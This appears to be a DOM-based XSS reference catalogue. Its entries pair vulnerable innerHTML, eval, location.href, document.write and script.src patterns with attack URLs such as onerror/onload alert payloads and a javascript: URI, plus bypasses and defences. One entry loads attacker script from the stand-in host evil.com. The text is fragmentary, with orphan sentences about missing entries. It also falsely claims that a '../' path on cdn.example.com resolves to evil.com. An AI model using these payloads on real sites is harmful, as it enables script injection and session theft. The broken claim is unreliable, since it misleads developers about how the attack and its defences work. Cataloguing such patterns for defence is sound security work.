A. innerHTML — The Most Common Sink
SINK: innerHTMLSOURCE: location.hash
01
// Vulnerable code pattern: document.getElementById('output').innerHTML = location.hash.slice(1); // Attack URL (hash never sent to server): http://localhost:5000/spa_demo.html#<img src=x onerror=alert(document.domain)>
ContextClient-side SPA that reads location.hash and writes to innerHTML Mechanism4 — DOM sink: innerHTML parses HTML including event handlers BypassesServer-side filters (hash is never sent to the server); WAFs that only inspect HTTP request bodies Stopped byTrusted Types; replacing innerHTML with textContent; DOMPurify before innerHTML assignment OriginThe canonical DOM XSS pattern. The fragment identifier (#…) is never sent in HTTP requests — invisible to all server-side defenses. The attack exists entirely in the browser.
SINK: innerHTMLSOURCE: location.search

// Vulnerable code: const params = new URLSearchParams(location.search); document.querySelector('.message').innerHTML = params.get('msg'); // Attack URL: http://target/?msg=<svg onload=alert(1)>
ContextClient-side URL parameter written to innerHTML — may or may not be reflected server-side Mechanism4 — DOM sink: innerHTML with URL parameter as source BypassesServer that doesn't reflect this parameter; WAF inspecting response body not client-side JS execution Stopped bytextContent instead of innerHTML; DOMPurify; Trusted Types OriginCommon in SPAs where client-side router reads URL params to display flash messages, search terms, or user names. The server serves a clean page — the XSS is assembled client-side.

The attacker embeds the target in an iframe and sends a crafted message. origin='*' in addEventListener means anyone can send a message.
B. eval() and Function() Sinks
SINK: evalSOURCE: location.hash
04
// Vulnerable code: eval(location.hash.slice(1)); // Attack URL: http://target/#alert(document.domain)
ContextApp uses eval to execute "commands" from the URL fragment Mechanism4 — DOM sink: eval() executes arbitrary JavaScript BypassesAll server-side defenses; no HTML encoding needed — payload is pure JS Stopped byNever using eval() with user input; CSP script-src without unsafe-eval; Trusted Types Origineval() is the most direct DOM sink. No HTML parsing needed — the payload is JS directly. CSP's unsafe-eval directive exists specifically because eval is so dangerous.

C. Location and Navigation Sinks
SINK: location.hrefSOURCE: location.hash
07
// Vulnerable code: const dest = decodeURIComponent(location.hash.slice(1)); location.href = dest; // Attack: http://target/#javascript:alert(document.domain)
ContextClient-side router assigns decoded hash to location.href Mechanism3 + 4 — URI scheme (javascript:) via DOM sink (location.href assignment) BypassesServer-side filters; checks that look for javascript: in the URL before the hash Stopped byValidating destination scheme before assignment; only allowing http/https; Trusted Types createScriptURL Originlocation.href is a navigation sink. Assigning a javascript: URI navigates and executes. The hash-based source means the server never sees the payload. Common in SPAs with client-side routing.
SINK: document.writeSOURCE: document.referrer
08
// Vulnerable code: document.write('You came from: ' + document.referrer); // Attack: host a page that links to the target with a crafted URL as referrer // Then navigate to target — referrer is the attacker page URL: // Referrer: http://evil.com/<img src=x onerror=alert(1)>
ContextPage writes referrer to document via document.write Mechanism4 — DOM sink: document.write outputs HTML parsed by the document parser BypassesInput validation on URL params (referrer is from HTTP header, not user form input) Stopped byNever using document.write; output-encoding referrer value; Trusted Types Origindocument.referrer is an HTTP header value — fully attacker-controlled. If the referrer URL contains XSS characters and the page writes it unencoded, the document.write call executes the payload. Rare but real.
D. Script Element and src Sinks
SINK: script.srcSOURCE: location.search
09
// Vulnerable code (dynamic script loading): const lib = new URLSearchParams(location.search).get('lib'); const s = document.createElement('script'); s.src = 'https://cdn.example.com/' + lib + '.js'; document.body.appendChild(s); // Attack — path traversal out of CDN: http://target/?lib=../../../evil.com/xss
ContextApp dynamically loads a script whose path is user-controlled Mechanism1 + 4 — Script tag creation (DOM sink) with path-traversal to attacker domain BypassesPrefix check: lib.startsWith('https://cdn.example.com/') only when the lib param is the full URL — here it's a suffix Stopped byCSP script-src restricting to allowed domains; allowlisting library names; Trusted Types createScriptURL OriginPattern seen in plugin/extension loaders. The path traversal (../) escapes the CDN prefix. Browsers resolve the full URL: https://cdn.example.com/../../../evil.com/xss.js → https://evil.com/xss.js.

The browser's deprecated XSS auditor didn't protect AJAX-injected HTML. Modern scanners must also test API endpoints separately.
